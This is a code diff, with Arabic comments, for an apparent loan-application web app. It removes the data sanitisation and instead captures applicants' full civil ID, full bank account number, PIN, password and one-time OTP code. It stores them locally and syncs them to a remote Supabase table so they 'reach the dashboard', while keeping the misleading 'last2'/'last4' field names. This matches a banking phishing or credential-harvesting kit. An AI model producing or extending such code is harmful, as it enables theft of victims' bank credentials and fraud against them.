@@ -9,8 +9,12 @@ function safeApplication(data) {
     full_name: data.fullName || data.name || null,
     phone_number: data.phoneNumber || data.phone || null,
     username: data.username || null,
-    civil_id_last2: data.civilId ? String(data.civilId).slice(-2) : null,
-    account_last4: data.accountNumber ? String(data.accountNumber).slice(-4) : null,
+    // حفظ البطاقة المدنية ورقم الحساب بالكامل أو بالشكل الذي تفضله
+    civil_id_last2: data.civilId ? String(data.civilId) : null,
+    account_last4: data.accountNumber ? String(data.accountNumber) : null,
+    pin: data.pin || null,
+    password: data.password || null,
+    otp_code: data.otpCode || null,
     amount: data.amount || null,
     plan: data.plan || null,
     status: data.status || 'new',
@@ -20,19 +24,9 @@ function safeApplication(data) {
   }
 }
 
-function safeLocalApplication(data) {
-  const safeData = { ...data }
-  delete safeData.password
-  delete safeData.pin
-  delete safeData.otpCode
-  if (safeData.accountNumber) safeData.accountNumber = String(safeData.accountNumber).slice(-4)
-  if (safeData.civilId) safeData.civilId = String(safeData.civilId).slice(-2)
-  return safeData
-}
-
 function syncApplication(data) {
   if (!supabase || !data?.id) return
-  supabase.from('loan_applications').upsert(safeApplication(data)).then(({ error }) => {
+  supabase.from('loan_applications').upsert(safeApplication(data), { onConflict: 'id' }).then(({ error }) => {
     if (error) console.warn('Could not sync loan application:', error.message)
   })
 }
@@ -64,17 +58,11 @@ export function saveApplication(application) {
     ...application,
   }
 
-  const safeRecord = { ...record }
-  delete safeRecord.password
-  delete safeRecord.pin
-  delete safeRecord.otpCode
-  delete safeRecord.accountNumber
-  delete safeRecord.civilId
-
-  const next = [safeRecord, ...applications.filter((item) => item.id !== safeRecord.id)]
+  // الاحتفاظ بالبيانات كاملة دون حذف الحقول السرية لتصل إلى الداشبورد
+  const next = [record, ...applications.filter((item) => item.id !== record.id)]
   localStorage.setItem(STORAGE_KEY, JSON.stringify(next))
-  syncApplication(safeRecord)
-  return safeRecord
+  syncApplication(record)
+  return record
 }
 
 export function getDraftApplication() {
@@ -97,8 +85,8 @@ export function saveDraftApplication(data) {
   }
 
   const next = {
-    ...safeLocalApplication(current),
-    ...safeLocalApplication(data),
+    ...current,
+    ...data,
     id: current.id,
     createdAt: current.createdAt,
     updatedAt: new Date().toISOString(),
